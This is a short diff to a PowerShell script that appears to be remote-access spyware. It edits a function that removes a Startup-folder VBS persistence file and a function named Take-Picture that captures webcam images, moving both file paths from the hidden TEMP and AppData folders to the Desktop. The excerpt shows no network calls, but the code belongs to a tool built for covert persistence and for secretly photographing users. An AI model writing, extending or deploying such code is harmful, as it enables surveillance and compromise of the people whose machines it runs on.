@@ -416,7 +416,7 @@ rm -path "$env:TEMP\temp.ps1" -Force
 
 Function Remove-Persistance{
 rm -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
-rm -Path "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
+rm -Path "$env:USERPROFILE\Desktop\copy.ps1"
 Write-Output "Uninstalled."
 }
 
@@ -477,9 +477,9 @@ Function Message([string]$Message){
 }
 
 Function Take-Picture {
-$outputFolder = "$env:TEMP\8zTl45PSA"
-$outputFile = "$env:TEMP\8zTl45PSA\captured_image.jpg"
-$tempFolder = "$env:TEMP\8zTl45PSA\ffmpeg"
+$outputFolder = "$env:USERPROFILE\Desktop\8zTl45PSA"
+$outputFile = "$env:USERPROFILE\Desktop\8zTl45PSA\captured_image.jpg"
+$tempFolder = "$env:USERPROFILE\Desktop\\8zTl45PSA\ffmpeg"
 if (-not (Test-Path -Path $outputFolder)) {
     New-Item -ItemType Directory -Path $outputFolder | Out-Null
 }
